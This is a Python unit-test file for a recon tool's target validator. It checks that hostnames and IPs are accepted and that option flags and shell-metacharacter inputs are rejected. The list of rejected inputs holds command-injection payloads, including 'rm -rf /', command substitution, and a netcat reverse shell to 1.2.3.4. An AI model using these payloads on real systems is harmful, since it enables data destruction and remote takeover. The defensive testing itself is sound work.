"""Unit tests for target validation and command injection defense."""

import pytest
from recon.scope import validate_target


def test_valid_targets():
    assert validate_target("example.com") == "example.com"
    assert validate_target("Sub-Domain.Example.com") == "sub-domain.example.com"
    assert validate_target("192.168.1.1") == "192.168.1.1"
    assert validate_target("10.0.0.0/24") == "10.0.0.0/24"
    assert validate_target("2001:db8::1") == "2001:db8::1"


def test_flag_injection_rejection():
    # Targets starting with hyphen must be rejected immediately
    with pytest.raises(ValueError, match="Cannot start with a hyphen"):
        validate_target("-sV")

    with pytest.raises(ValueError, match="Cannot start with a hyphen"):
        validate_target("--script=vuln")

    with pytest.raises(ValueError, match="Cannot start with a hyphen"):
        validate_target("-T5")


def test_shell_metacharacter_rejection():
    dangerous_inputs = [
        "example.com; rm -rf /",
        "example.com && whoami",
        "example.com | nc -e /bin/sh 1.2.3.4 4444",
        "example.com`id`",
        "$(whoami).example.com",
        "example.com > /tmp/out",
        "example.com\nwhoami",
        "example.com\0admin",
        "example com",
        "example.com'",
        'example.com"',
    ]

    for malicious in dangerous_inputs:
        with pytest.raises(ValueError):
            validate_target(malicious)


def test_empty_target_rejection():
    with pytest.raises(ValueError):
        validate_target("")

    with pytest.raises(ValueError):
        validate_target("   ")
